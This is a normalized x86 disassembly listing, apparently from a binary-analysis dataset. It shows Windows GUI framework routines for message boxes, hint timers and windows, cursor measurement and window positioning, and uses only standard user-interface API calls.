call sub_41a08c
jmp r-xdata
sub_4603a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_4603e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4470a0
mov [ esi + 0x44 ] edi
sub_460424
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_460502
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_45728c
call sub_407eb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460509
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_45aa70
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_4604c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_460290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_459978
mov eax [ ebp - 0x4 ]
call sub_45fd4c
jmp r-xdata
sub_460524
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40281c
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40283c
push eax
call sub_40281c
pop edx
call sub_40b7f0
call sub_40281c
mov edx [ rw-data ]
call sub_4033a8
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40281c
mov edx eax
mov eax ebx
call sub_46071c
pop esi
pop ebx
retn
call sub_40281c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_4605b4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_457314
mov [ ebp - 0x10 ] eax
call sub_457230
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45f4b0
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_460709
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460710
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_4573c8
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_457238
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46071c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4607d7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404004
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45ff38
mov eax [ ebp - 0x108 ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
mov eax ebx
pop ecx
call sub_4605b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607de
lea eax [ ebp - 0x108 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
call sub_4086e0
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d24
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b3c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404234
sub_4607f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_447260
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4473c8
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_460e98
test al al
je r-xdata
call sub_4470c4
mov ebp eax
mov eax edi
call sub_4470c4
mov ebp eax
mov eax esi
call sub_460e98
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46095c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4609b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_460e98
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4616e4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4609bb
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4609c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_460a1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_460e98
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4616e4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460a23
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_460a34
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_40321c
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_440a44
jmp r-xdata
sub_460a84
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45df88
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4470c4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45df74
mov ebx eax
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax ebx
call sub_4470c4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_460ae8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43f150
mov edi eax
call sub_43da4c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_441a58
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_441a58
sub_460b60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460c70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_460ae8
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45eaf0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43da08
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_460d20
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_460c17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4610b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_460a84
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41f99c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460c77
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_460c80
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45df6c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45df58
movzx edx di
xor ecx ecx
call sub_441a58
inc esi
dec ebx
jne r-xdata
sub_460cbc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45fd30
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45fd30
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_460c80
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_460d20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404378
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403fc0
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a4b4
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d360
xor eax eax
push ebp
push sub_460da5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_460db4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_460e10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45df6c
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_460db4
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45df58
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_460db4
pop ecx
jmp r-xdata
mov eax ebx
call sub_4473c8
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4470c4
push eax
call IsChild
test eax eax
jne r-xdata
sub_460e98
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40599c
call sub_42b4d4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_460ec0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_460f04
push sub_45eb48
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4610b8
sub_460f2c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cd4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4403bc
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43f150
call sub_45eb28
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4610b8
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cd4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4403bc
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4610b8
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_460ec0
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_441a58
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_461350
jmp r-xdata
sub_46103c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_460f04
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_461350
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_461074
jmp r-xdata
sub_461074
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4473c8
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4470c4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4470c4
push eax
call ShowWindow
sub_4610b8
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_461074
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45ecb0
mov eax ebx
call sub_460f04
sub_4610f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_461232
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_42506c
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407e6c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_461203
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_425124
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46120a
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4027ac
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4610e0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4610e0
mov [ ebp - 0x4 ] eax
sub_46120a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_461244
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_40321c
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403164
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4612a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46133e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461345
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40405c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_423c2c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c4f0
mov ebx eax
inc ebx
sub_461350
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404904
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4616d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4610b8
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460ec0
jmp r-xdata
call sub_4574e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4616dd
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049d4
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43f150
call sub_45eb28
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_4610f0
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45deec
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_440244
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4403e8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45eaf0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43d9c4
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404004
xor eax eax
mov [ ebp - 0x30 ] eax
